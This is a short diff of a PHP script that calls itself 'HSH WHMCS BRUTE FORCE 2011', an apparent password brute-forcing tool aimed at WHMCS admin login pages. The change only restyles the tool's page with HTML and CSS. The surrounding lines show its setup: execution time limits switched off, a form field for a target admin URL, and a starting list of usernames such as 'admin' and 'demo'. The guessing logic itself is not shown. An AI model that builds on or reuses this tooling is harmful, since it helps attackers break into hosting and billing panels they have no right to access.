@@ -6,7 +6,7 @@
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0)
-echo "<center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
+echo "<html><head><link rel=\"SHORTCUT ICON\" href=\"http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif\"><title> >-|I|-> HsH 2011 <-|I|-< </title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"><style> body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px } A:link {text-decoration: none;color: aqua;} A:active {text-decoration: none;color: aqua;} A:visited {text-decoration: none;color: lime;} A:hover {text-decoration: underline; color: Fuchsia;} #new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;} input:hover,tr:hover,td:hover{background-color:  ; color: aqua;} </style><style type=\"text/css\"></style><style type=\"text/css\"></style></head><center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
 echo "<textarea rows='15' cols='45' name=\"site\">http://target.com/admin/</textarea>\n"; 
 echo "<textarea rows='15' cols='30' name=\"user\">admin \n"; 
 echo "demo\n"; 
